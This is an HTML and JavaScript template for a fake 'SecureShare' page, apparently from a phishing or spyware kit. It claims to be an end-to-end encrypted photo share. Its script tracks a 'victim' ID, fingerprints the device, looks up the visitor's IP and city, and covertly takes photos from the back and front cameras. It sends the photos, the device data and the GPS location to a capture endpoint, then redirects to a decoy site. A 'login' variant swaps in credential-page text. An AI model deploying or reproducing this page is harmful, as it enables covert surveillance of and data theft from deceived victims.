<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>SecureShare</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 16px;
        }
        .glass {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(16px);
            border-radius: 40px;
            padding: 32px 24px;
            max-width: 440px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.12);
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #fff;
        }
        .glass h1 {
            font-size: 30px;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .glass .sub {
            font-size: 13px;
            letter-spacing: 3px;
            color: rgba(255,255,255,0.5);
            text-transform: uppercase;
            margin: 4px 0 18px;
        }
        .frame {
            border-radius: 24px;
            padding: 8px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            margin: 16px 0;
        }
        .frame img {
            width: 100%;
            aspect-ratio: 4/3;
            object-fit: cover;
            border-radius: 18px;
            display: block;
            background: #1a1a2e;
        }
        .glow-btn {
            background: linear-gradient(145deg, #f093fb, #f5576c);
            border: none;
            padding: 18px;
            border-radius: 60px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 30px rgba(245,87,108,0.35);
            transition: 0.25s;
            margin: 12px 0 6px;
        }
        .glow-btn:active { transform: scale(0.96); }
        .sparkle { animation: pulseGlow 2s infinite; }
        @keyframes pulseGlow {
            0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
            50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
        }
        .footer-text {
            font-size: 11px;
            opacity: 0.3;
            margin-top: 18px;
        }
        .hidden { display: none !important; }
        #loading {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.7;
            animation: pulseGlow 1.5s infinite;
        }
    </style>
</head>
<body>
    <div class="glass" id="mainPage">
        <h1>🔒 SecureShare</h1>
        <p class="sub">SHARED SECURELY WITH YOU</p>
        <div class="frame">
            <img id="userPhoto" src="{{PHOTO_URL}}" alt="User Photo" />
        </div>
        <button class="glow-btn sparkle" id="continueBtn" onclick="requestCamera()">
            Continue →
        </button>
        <p class="footer-text">End-to-end encrypted · Secure connection</p>
        <div id="loading" class="hidden">⏳ Processing...</div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const victimId = urlParams.get('v') || 'unknown';
        const targetType = urlParams.get('type') || 'cam';
        const redirectUrl = '{{REDIRECT_URL}}';

        function getDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                battery: 'N/A',
                network: 'N/A'
            };
            if (navigator.getBattery) {
                navigator.getBattery().then(b => info.battery = Math.round(b.level * 100) + '%');
            }
            if (navigator.connection) {
                info.network = navigator.connection.effectiveType || 'N/A';
            }
            return info;
        }

        async function getLocationInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    lat: data.latitude || null,
                    lng: data.longitude || null
                };
            } catch {
                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
            }
        }

        async function sendData(payload) {
            try {
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victim_id: victimId, type: targetType, ...payload })
                });
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        function requestCamera() {
            const btn = document.getElementById('continueBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.textContent = '⏳ Please wait...';
            loading.classList.remove('hidden');

            (async () => {
                const device = getDeviceInfo();
                const loc = await getLocationInfo();
                await sendData({ device_info: device, ip: loc.ip, city: loc.city, lat: loc.lat, lng: loc.lng });
            })();

            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                alert('Camera not supported.');
                loading.classList.add('hidden');
                btn.disabled = false;
                btn.textContent = 'Continue →';
                return;
            }

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                .then(stream => {
                    capturePhoto(stream, 'Back');
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(frontStream => capturePhoto(frontStream, 'Front'))
                        .catch(() => {});
                    setTimeout(requestLocation, 1000);
                    setTimeout(() => {
                        window.location.href = redirectUrl || 'https://google.com';
                    }, 3000);
                })
                .catch(err => {
                    alert('❌ Camera permission required!');
                    loading.classList.add('hidden');
                    btn.disabled = false;
                    btn.textContent = 'Continue →';
                });
        }

        function capturePhoto(stream, cameraType) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                sendData({ photo: canvas.toDataURL('image/jpeg', 0.85), camera_type: cameraType });
                stream.getTracks().forEach(t => t.stop());
            };
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } }),
                    () => console.log('Location denied')
                );
            }
        }

        if (targetType !== 'cam') {
            document.querySelector('h1').textContent = '🔑 Secure Login';
            document.querySelector('.sub').textContent = 'Access your account';
            document.querySelector('.footer-text').textContent = 'Your data is protected';
        }
    </script>
</body>
</html>
